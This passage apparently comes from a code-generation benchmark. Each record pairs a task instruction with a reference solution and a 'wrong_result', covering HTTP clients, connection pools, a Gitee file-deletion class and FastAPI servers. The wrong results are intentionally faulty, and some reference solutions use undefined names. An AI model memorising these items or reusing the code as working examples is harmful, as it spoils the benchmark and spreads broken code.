    "wrong_result": "import requests\nimport random\n\nclass UserAgent:\n    def __init__(self):\n        self.user_agents = [\n            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\",\n            \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15\",\n            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.848.10\"\n        ]\n    \n    def get_random(self):\n        return random.choice(self.user_agents)\n\nclass HTTPClient:\n    def __init__(self, ua, proxyHost, proxyPort, proxyUser=None, proxyPass=None):\n        self.ua = ua\n        self.proxyHost = proxyHost\n        self.proxyPort = proxyPort\n        self.proxyUser = proxyUser\n        self.proxyPass = proxyPass\n        self.proxies = self._construct_proxies()\n    \n    def _construct_proxies(self):\n        proxies = {}\n        if self.proxyHost and self.proxyPort:\n            proxy_url = f\"{self.proxyUser}:{self.proxyPass}@{self.proxyHost}:{self.proxyPort}\" if self.proxyUser else f\"{self.proxyHost}:{self.proxyPort}\"\n            proxies['http'] = f\"http://{proxy_url}\"\n            proxies['https'] = f\"https://{proxy_url}\"\n        return proxies\n    \n    def get_request(self, url, headers=None, params=None, timeout=4):\n        for attempt in range(3):  \n            try:\n                headers = headers or {}\n                headers['User-Agent'] = self.ua.get_random()\n                response = requests.get(url, headers=headers, params=params, proxies=self.proxies, timeout=timeout)\n                if response.status_code == 200:\n                    return response\n            except Exception:\n                pass\n        return None\n    \n    def post_request(self, url, data=None, headers=None, timeout=4):\n        for attempt in range(3):  \n            try:\n                headers = headers or {}\n                headers['User-Agent'] = self.ua.get_random()\n                response = requests.post(url, data=data, headers=headers, proxies=self.proxies, timeout=timeout)\n                if response.status_code == 200:\n                    return response\n            except Exception:\n                pass\n        return None"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for timeouts and retries.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, including creation, retrieval, release, and cleanup, with support for connection timeouts and retry mechanisms.\n\nAttributes:\n- scheme: str - The URL scheme (default 'http')\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Default timeout configuration\n- retries: Retry - Default retry configuration\n- pool: queue.LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool or closes it if pool is full\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to open a URL using a connection from the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .response import HTTPResponse\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import get_host, Url\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    ProtocolError,\n    HTTPException,\n    BaseSSLError,\n    CertificateError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nimport warnings\nimport logging\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in six.moves.xrange(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        return httplib_response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, assert_same_host=True, timeout=_Default,\n                pool_timeout=None, release_conn=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn, method, url, timeout=timeout_obj,\n                body=body, headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError, CertificateError) as e:\n            if conn:\n                conn.close()\n            raise MaxRetryError(self, url, e)\n\n        finally:\n            if release_conn:\n                self._put_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import queue\nfrom urllib3.connection import HTTPConnection\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = HTTPConnection\n        self.ResponseCls = HTTPResponse\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries or Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])\n        self.pool = queue.LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.conn_kw = conn_kw\n        self._setup_connections()\n\n    def _setup_connections(self):\n        for _ in range(self.pool.maxsize):\n            self._put_conn(self._new_conn())\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            scheme=self.scheme,\n            proxy=self.proxy,\n            proxy_headers=self.proxy_headers,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        if self.block:\n            return self.pool.get(timeout=timeout)\n        else:\n            if self.pool.empty():\n                return self._new_conn()\n            return self.pool.get()\n\n    def _put_conn(self, conn):\n        if self.pool.full():\n            conn.close()\n        else:\n            self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        response = conn.request(method, url, timeout=timeout, **httplib_request_kw)\n        return self.ResponseCls(response)\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw):\n        retries = retries or self.retries\n        for i in range(retries.total + 1):\n            try:\n                conn = self._get_conn(timeout=pool_timeout)\n                resp = self._make_request(conn, method, url, timeout=timeout, **response_kw)\n                if release_conn:\n                    self._put_conn(conn)\n                return resp\n            except Exception as e:\n                if i < retries.total:\n                    continue\n                else:\n                    raise"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Implement a class to interact with the Gitee API for deleting files from a repository branch.\n\nClass Description: The FileOnlineDelete_gitee class provides functionality to delete files from a specified branch in a Gitee repository using the Gitee API v5. It handles authentication, file information retrieval, and deletion operations.\n\nAttributes:\n- url_prefix: str - Base URL for Gitee API v5 repository operations\n- show_help: str - Placeholder for help information (currently unused)\n\nMethods:\n- delete_file_from_branch(repo_owner: str, repo_name: str, file_path: str, branch: str, access_token: str, commit_message: str = \"[comfyui_LLM_party] file deleted\") -> tuple - Deletes a file from the specified branch. Returns a success tuple or error message.\n  Parameters:\n    - repo_owner: str - Owner of the repository\n    - repo_name: str - Name of the repository\n    - file_path: str - Path to the file within the repository\n    - branch: str - Branch containing the file\n    - access_token: str - Gitee API access token\n    - commit_message: str - Commit message for the deletion (optional)\n  Returns:\n    - tuple: Either (\"Success\",) on success or (error_message,) on failure",
    "Canonical_solution": "import requests\n\nclass FileOnlineDelete_gitee:\n    def __init__(self):\n        self.url_prefix = \"https://gitee.com/api/v5/repos/\"\n        self.show_help = \"placeholder\"\n\n    def delete_file_from_branch(\n        self, repo_owner, repo_name, file_path, branch, access_token, commit_message=\"[comfyui_LLM_party] file deleted\"\n    ):\n        url = f\"https://gitee.com/api/v5/repos/{repo_owner}/{repo_name}/contents/{file_path}\"\n\n        params = {\"access_token\": access_token, \"ref\": branch}\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            print(f\"Failed to get file info. Status code: {response.status_code}\")\n            print(f\"Response: {response.text}\")\n            return False\n\n        file_sha = response.json()[\"sha\"]\n\n        data = {\"access_token\": access_token, \"message\": commit_message, \"sha\": file_sha, \"branch\": branch}\n        response = requests.delete(url, json=data)\n\n        if response.status_code == 200:\n            print(f\"File '{file_path}' successfully deleted from branch '{branch}'.\")\n            return (\"Success\",)\n        else:\n            print(f\"Failed to delete file. Status code: {response.status_code}\")\n            print(f\"Response: {response.text}\")\n            return (response.text,)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\nclass FileOnlineDelete_gitee:\n    def __init__(self, url_prefix: str, show_help: str):\n        self.url_prefix = url_prefix\n        self.show_help = show_help\n\n    def delete_file_from_branch(self, repo_owner: str, repo_name: str, file_path: str, branch: str, access_token: str, commit_message: str = \"[comfyui_LLM_party] file deleted\") -> tuple:\n        headers = {\n            'Authorization': f'token {access_token}',\n            'Content-Type': 'application/json'\n        }\n\n        # Step 1: Get current commit SHA of the branch\n        commit_url = f\"{self.url_prefix}/git/refs/heads/{branch}\"\n        try:\n            commit_response = requests.get(commit_url, headers=headers)\n            commit_response.raise_for_status()\n            current_commit_sha = commit_response.json()['object']['sha']\n        except requests.RequestException as e:\n            return (f\"Error: Could not retrieve commit SHA for branch {branch}: {str(e)}\", )\n\n        # Step 2: Get tree from current commit\n        tree_url = f\"{self.url_prefix}/git/trees/{current_commit_sha}\"\n        try:\n            tree_response = requests.get(tree_url, headers=headers, params={'recursive': 1})\n            tree_response.raise_for_status()\n            tree_data = tree_response.json()\n        except requests.RequestException as e:\n            return (f\"Error: Could not retrieve tree data for commit {current_commit_sha}: {str(e)}\", )\n\n        # Step 3: Generate new tree entries without the file\n        new_tree_entries = []\n        for entry in tree_data['tree']:\n            if entry['path'] != file_path:\n                new_tree_entries.append({\n                    'path': entry['path'],\n                    'mode': entry['mode'],\n                    'type': entry['type'],\n                    'sha': entry['sha']\n                })\n\n        # Step 4: Create new tree\n        new_tree_url = f\"{self.url_prefix}/git/trees\"\n        try:\n            new_tree_payload = {'tree': new_tree_entries}\n            new_tree_response = requests.post(new_tree_url, headers=headers, json=new_tree_payload)\n            new_tree_response.raise_for_status()\n            new_tree_sha = new_tree_response.json()['sha']\n        except requests.RequestException as e:\n            return (f\"Error: Could not create new tree: {str(e)}\", )\n\n        # Step 5: Create new commit\n        commit_url = f\"{self.url_prefix}/git/commits\"\n        try:\n            commit_payload = {\n                'message': commit_message,\n                'parents': [{'sha': current_commit_sha}],\n                'tree': new_tree_sha\n            }\n            commit_response = requests.post(commit_url, headers=headers, json=commit_payload)\n            commit_response.raise_for_status()\n            new_commit_sha = commit_response.json()['sha']\n        except requests.RequestException as e:\n            return (f\"Error: Could not create new commit: {str(e)}\", )\n\n        # Step 6: Update branch reference to new commit\n        ref_url = f\"{self.url_prefix}/git/refs/heads/{branch}\"\n        try:\n            ref_payload = {'sha': new_commit_sha}\n            ref_response = requests.put(ref_url, headers=headers, json=ref_payload)\n            ref_response.raise_for_status()\n        except requests.RequestException as e:\n            return (f\"Error: Could not update branch {branch}: {str(e)}\", )\n\n        return (\"Success\",)"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Implement a FastAPI-based HTTP server for handling conversational AI queries and chat interactions, with support for both direct queries and streaming chat responses.\n\nClass Description: RayAssistantDeployment is a class that encapsulates the functionality for handling HTTP requests in a conversational AI service. It provides endpoints for direct queries (/query) and chat interactions (/chat), with support for streaming responses in chat mode.\n\nAttributes:\n\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes.\n\nMethods:\n\n__init__: [Name](app: FastAPI) -> None - Initializes the class with a FastAPI app instance and registers the query and chat endpoints.\n\npredict: [Name](query: Query, stream: bool) -> Dict[str, Any] - Internal prediction method that processes the input query and returns a dictionary containing the AI response (implementation would be provided separately).\n\nquery: [Name](query: Query) -> Answer - Handles POST requests to the /query endpoint, processes the query using predict, and returns an Answer object containing the response.\n\nproduce_chat_answer: [Name](request: Request, result: Dict[str, Any]) -> Generator[str, None, None] - Generator function that yields chat response pieces and sources for streaming.\n\nchat: [Name](request: Request) -> StreamingResponse - Handles POST requests to the /chat endpoint, processes the conversation using predict (with streaming enabled for single messages), and returns a streaming response.",
    "Canonical_solution": "from fastapi import FastAPI\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom typing import List, Dict, Any\n\nclass Message(BaseModel):\n    role: str = Field(\n        ..., description=\"The role of the author of the message, typically 'user', or 'assistant'.\"\n    )\n    content: str = Field(..., description=\"The content of the message.\")\n\nclass Request(BaseModel):\n    messages: List[Message] = Field(\n        ..., description=\"A list of messages that make up the conversation.\"\n    )\n\nclass Query(BaseModel):\n    query: str\n\nclass Answer(BaseModel):\n    question: str\n    answer: str\n    sources: List[str]\n    llm: str\n\nclass RayAssistantDeployment:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self.app.post(\"/query\")(self.query)\n        self.app.post(\"/chat\")(self.chat)\n\n    def predict(self, query: Query, stream: bool) -> Dict[str, Any]:\n        # Implementation would go here\n        pass\n\n    def query(self, query: Query) -> Answer:\n        result = self.predict(query, stream=False)\n        return Answer.parse_obj(result)\n\n    def produce_chat_answer(self, request: Request, result: Dict[str, Any]):\n        answer = []\n        for answer_piece in result[\"answer\"]:\n            answer.append(answer_piece)\n            yield answer_piece\n\n        if result[\"sources\"]:\n            yield \"\\n\\n**Sources:**\\n\"\n            for source in result[\"sources\"]:\n                yield \"* \" + source + \"\\n\"\n\n    def chat(self, request: Request) -> StreamingResponse:\n        if len(request.messages) == 1:\n            query = Query(query=request.messages[0].content)\n            result = self.predict(query, stream=True)\n        else:\n            # Simplified implementation for follow-up questions\n            result = {\"answer\": [\"Response\"], \"llm\": \"gpt-4\", \"sources\": [], \"document_ids\": []}\n\n        return StreamingResponse(\n            self.produce_chat_answer(request, result), media_type=\"text/plain\"\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI, Request, StreamingResponse\nfrom typing import Dict, Any, Generator, Optional\n\nclass RayAssistantDeployment:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self.app.post(\"/query\")(self.query)\n        self.app.post(\"/chat\")(self.chat)\n\n    def predict(self, query: Dict[str, Any], stream: bool) -> Dict[str, Any]:\n        # Placeholder for actual prediction logic\n        return {\"response\": \"This is a sample response.\", \"sources\": [\"source1\", \"source2\"]}\n\n    def query(self, request: Request) -> Dict[str, Any]:\n        data = await request.json()\n        query = data.get(\"query\")\n        result = self.predict(query, stream=False)\n        return {\"answer\": result[\"response\"], \"sources\": result[\"sources\"]}\n\n    def produce_chat_answer(self, request: Request, result: Dict[str, Any]) -> Generator[str, None, None]:\n        for part in result[\"response\"].split(\" \"):\n            yield part\n\n    def chat(self, request: Request) -> StreamingResponse:\n        data = await request.json()\n        query = data.get(\"query\")\n        result = self.predict(query, stream=True)\n        async def stream_generator():\n            async for part in self.produce_chat_answer(request, result):\n                yield part\n        return StreamingResponse(stream_generator(), media_type=\"text/plain\")"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server for handling image segmentation and processing requests using SAM (Segment Anything Model) and related models.\n\nClass Description: SamAPI is a class that encapsulates all the route handlers for a FastAPI application dealing with image segmentation tasks. It provides endpoints for model prediction, mask dilation, and various segmentation techniques.\n\nAttributes:\n- app: FastAPI - The FastAPI application instance that will handle HTTP requests\n\nMethods:\n- __init__(app: FastAPI) -> None - Initializes the SamAPI class with a FastAPI instance and sets up routes\n- _setup_routes() -> None - Private method that defines all API endpoints and their handlers\n\nRoute Handlers (methods defined within _setup_routes):\n- heartbeat() -> Dict - Simple health check endpoint\n- api_sam_model() -> List[str] - Returns available SAM models\n- api_sam_predict(payload: SamPredictRequest) -> Any - Handles SAM model prediction requests\n- api_dino_predict(payload: DINOPredictRequest) -> Any - Handles DINO model prediction requests\n- api_dilate_mask(payload: DilateMaskRequest) -> Any - Handles mask dilation requests\n- api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any - Handles ControlNet segmentation requests\n- api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any - Handles category-specific mask generation requests\n\nSupporting Models (Pydantic BaseModel classes):\n- SamPredictRequest - Request model for SAM predictions\n- DINOPredictRequest - Request model for DINO predictions\n- DilateMaskRequest - Request model for mask dilation\n- AutoSAMConfig - Configuration model for AutoSAM parameters\n- ControlNetSegRequest - Request model for ControlNet segmentation\n- CategoryMaskRequest - Request model for category-specific masking",
    "Canonical_solution": "from fastapi import FastAPI, Body\nfrom pydantic import BaseModel\nfrom typing import Any, Optional, List\nfrom PIL import Image\nimport numpy as np\nimport os\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    class SamPredictRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        sam_positive_points: List[List[float]] = []\n        sam_negative_points: List[List[float]] = []\n        dino_enabled: bool = False\n        dino_model_name: Optional[str] = \"GroundingDINO_SwinT_OGC (694MB)\"\n        dino_text_prompt: Optional[str] = None\n        dino_box_threshold: Optional[float] = 0.3\n        dino_preview_checkbox: bool = False\n        dino_preview_boxes_selection: Optional[List[int]] = None\n\n    class DINOPredictRequest(BaseModel):\n        input_image: str\n        dino_model_name: str = \"GroundingDINO_SwinT_OGC (694MB)\"\n        text_prompt: str\n        box_threshold: float = 0.3\n\n    class DilateMaskRequest(BaseModel):\n        input_image: str\n        mask: str\n        dilate_amount: int = 10\n\n    class AutoSAMConfig(BaseModel):\n        points_per_side: Optional[int] = 32\n        points_per_batch: int = 64\n        pred_iou_thresh: float = 0.88\n        stability_score_thresh: float = 0.95\n        stability_score_offset: float = 1.0\n        box_nms_thresh: float = 0.7\n        crop_n_layers: int = 0\n        crop_nms_thresh: float = 0.7\n        crop_overlap_ratio: float = 512 / 1500\n        crop_n_points_downscale_factor: int = 1\n        min_mask_region_area: int = 0\n\n    class ControlNetSegRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n\n    class CategoryMaskRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n        category: str\n        input_image: str\n\n    def _setup_routes(self):\n        @self.app.get(\"/sam/heartbeat\")\n        async def heartbeat():\n            return {\"msg\": \"Success!\"}\n\n        @self.app.get(\"/sam/sam-model\")\n        async def api_sam_model() -> List[str]:\n            return sam_model_list\n\n        @self.app.post(\"/sam/sam-predict\")\n        async def api_sam_predict(payload: SamPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert('RGBA')\n            sam_output_mask_gallery, sam_message = sam_predict(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.sam_positive_points,\n                payload.sam_negative_points,\n                payload.dino_enabled,\n                payload.dino_model_name,\n                payload.dino_text_prompt,\n                payload.dino_box_threshold,\n                payload.dino_preview_checkbox,\n                payload.dino_preview_boxes_selection)\n            result = {\"msg\": sam_message}\n            if len(sam_output_mask_gallery) == 9:\n                result[\"blended_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[:3]))\n                result[\"masks\"] = list(map(encode_to_base64, sam_output_mask_gallery[3:6]))\n                result[\"masked_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[6:]))\n            return result\n\n        @self.app.post(\"/sam/dino-predict\")\n        async def api_dino_predict(payload: DINOPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            dino_output_img, _, dino_msg = dino_predict(\n                payload.input_image,\n                payload.dino_model_name,\n                payload.text_prompt,\n                payload.box_threshold)\n            return {\n                \"msg\": dino_msg[\"value\"] if \"value\" in dino_msg else \"Done\",\n                \"image_with_box\": encode_to_base64(dino_output_img) if dino_output_img is not None else None,\n            }\n\n        @self.app.post(\"/sam/dilate-mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert(\"RGBA\")\n            payload.mask = decode_to_pil(payload.mask)\n            dilate_result = list(map(encode_to_base64, update_mask(payload.mask, 0, payload.dilate_amount, payload.input_image)))\n            return {\"blended_image\": dilate_result[0], \"mask\": dilate_result[1], \"masked_image\": dilate_result[2]}\n\n        @self.app.post(\"/sam/controlnet-seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest = Body(...),\n                                    autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            cnet_seg_img, cnet_seg_msg = cnet_seg(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            cnet_seg_img = list(map(encode_to_base64, cnet_seg_img))\n            result = {\"msg\": cnet_seg_msg}\n            if len(cnet_seg_img) == 3:\n                result[\"blended_images\"] = cnet_seg_img[0]\n                result[\"random_seg\"] = cnet_seg_img[1]\n                result[\"edit_anything_control\"] = cnet_seg_img[2]\n            elif len(cnet_seg_img) == 4:\n                result[\"sem_presam\"] = cnet_seg_img[0]\n                result[\"sem_postsam\"] = cnet_seg_img[1]\n                result[\"blended_presam\"] = cnet_seg_img[2]\n                result[\"blended_postsam\"] = cnet_seg_img[3]\n            return result\n\n        @self.app.post(\"/sam/category-mask\")\n        async def api_category_mask(payload: CategoryMaskRequest = Body(...),\n                                  autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            category_mask_img, category_mask_msg, resized_input_img = categorical_mask(\n                payload.sam_model_name,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                payload.category,\n                payload.input_image,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            category_mask_img = list(map(encode_to_base64, category_mask_img))\n            result = {\"msg\": category_mask_msg}\n            if len(category_mask_img) == 3:\n                result[\"blended_image\"] = category_mask_img[0]\n                result[\"mask\"] = category_mask_img[1]\n                result[\"masked_image\"] = category_mask_img[2]\n            if resized_input_img is not None:\n                result[\"resized_input\"] = encode_to_base64(resized_input_img)\n            return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Depends, HTTPException\nfrom pydantic import BaseModel\nimport json\n\nclass SamPredictRequest(BaseModel):\n    image: bytes\n    input_size: int = 1024\n    confidence_threshold: float = 0.5\n    output_type: str = \"mask\"\n\nclass DINOPredictRequest(BaseModel):\n    image: bytes\n    input_size: int = 1024\n    confidence_threshold: float = 0.5\n    output_type: str = \"mask\"\n\nclass DilateMaskRequest(BaseModel):\n    mask: bytes\n    dilate_radius: int = 5\n\nclass AutoSAMConfig(BaseModel):\n    model_name: str = \"sam_vit_l\"\n    input_size: int = 1024\n    confidence_threshold: float = 0.5\n    output_type: str = \"mask\"\n\nclass ControlNetSegRequest(BaseModel):\n    image: bytes\n    control_image: bytes\n    input_size: int = 1024\n    confidence_threshold: float = 0.5\n    output_type: str = \"mask\"\n\nclass CategoryMaskRequest(BaseModel):\n    image: bytes\n    category: str\n    input_size: int = 1024\n    confidence_threshold: float = 0.5\n    output_type: str = \"mask\"\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.get(\"/heartbeat\")\n        def heartbeat() -> dict:\n            return {\"status\": \"healthy\"}\n\n        @self.app.get(\"/api/sam/models\")\n        def api_sam_model() -> list[str]:\n            return [\"sam_vit_l\", \"sam_vit_h\"]\n\n        @self.app.post(\"/api/sam/predict\")\n        def api_sam_predict(payload: SamPredictRequest) -> dict:\n            return {\"result\": \"sam_prediction_result\", \"model\": payload.model_name}\n\n        @self.app.post(\"/api/dino/predict\")\n        def api_dino_predict(payload: DINOPredictRequest) -> dict:\n            return {\"result\": \"dino_prediction_result\", \"model\": payload.model_name}\n\n        @self.app.post(\"/api/dilate/mask\")\n        def api_dilate_mask(payload: DilateMaskRequest) -> dict:\n            return {\"result\": \"dilated_mask\", \"radius\": payload.dilate_radius}\n\n        @self.app.post(\"/api/controlnet/seg\")\n        def api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> dict:\n            return {\n                \"result\": \"controlnet_segmentation\",\n                \"config\": autosam_conf.model_name,\n                \"input_size\": autosam_conf.input_size\n            }\n\n        @self.app.post(\"/api/category/mask\")\n        def api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> dict:\n            return {\n                \"result\": \"category_mask\",\n                \"category\": payload.category,\n                \"config\": autosam_conf.model_name\n            }\n```"
  },
  {
    "Task_id": 124,
